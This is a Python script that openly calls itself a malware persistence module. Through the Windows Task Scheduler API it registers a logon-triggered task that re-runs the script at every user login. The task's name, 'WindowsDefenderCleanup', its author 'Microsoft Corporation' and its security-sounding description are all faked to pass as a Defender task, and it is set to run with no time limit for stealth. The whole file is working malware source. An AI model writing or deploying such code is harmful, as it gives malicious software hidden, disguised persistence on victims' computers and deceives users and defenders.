"""
NAME: Persistence Module (Windows Scheduled Tasks)
Description: This module ensures the malware automatically executes every 
time the user logs into the system. It utilizes the Windows 'schtasks' 
utility to create a scheduled task pointing to the current executable. 
This allows the process to remain resilient against system reboots and 
unexpected shutdowns without requiring manual intervention.
"""

import os
import win32com.client # WINDOWS API 

#1. CHECK WHICH ROUTE THE MALWARE IS 

current_path = os.path.realpath(__file__)
print(current_path)

#2. CHECK IF THE TASK ALREADY EXISTS
def task(taskName): 
    scheduler = win32com.client.Dispatch("Schedule.Service")
    scheduler.Connect()
    root_folder = scheduler.GetFolder("\\") # Obtiene la carpeta raiz del Task Scheduler
    try:
        root_folder.GetTask(taskName) 
        return True
   
    except Exception: # CREATE TASK 
        # Create a new task definition object
        task_definition = scheduler.NewTask(0)

        # 1. Task Registration Information
        task_definition.RegistrationInfo.Description = "Maintains security signature database integrity and optimizes system performance."
        task_definition.RegistrationInfo.Author = "Microsoft Corporation"

        # 2. Trigger Configuration (Logon)
        # TASK_TRIGGER_LOGON = 9
        trigger = task_definition.Triggers.Create(9)
        trigger.Id = "LogonTriggerId"

        # 3. Action Configuration (Execute the binary)
        # TASK_ACTION_EXEC = 0
        action = task_definition.Actions.Create(0)
        action.Path = current_path

        # 4. Behavioral Settings (Stealth & Persistence)
        task_definition.Settings.IsXml = False 
        task_definition.Settings.StopIfGoingOnBatteries = False
        task_definition.Settings.DisallowStartIfOnBatteries = False
        task_definition.Settings.ExecutionTimeLimit = "PT0S"  # No time limit (ISO 8601 duration)
        task_definition.Settings.Priority = 7 # Normal/Low priority to avoid CPU spikes

        # 5. Register the task in the root folder
        # TASK_CREATE_OR_UPDATE = 6, TASK_LOGON_INTERACTIVE_TOKEN = 3
        root_folder.RegisterTaskDefinition(
            taskName,
            task_definition,
            6,      # Create or Update
            None,   # User (None uses current user)
            None,   # Password
            3       # Run only when the user is logged in
        )
        return False # Return False indicating the task was not found and was created 
     
        











print(task("WindowsDefenderCleanup")) #WindowsDefenderCleanup = name of the fake task

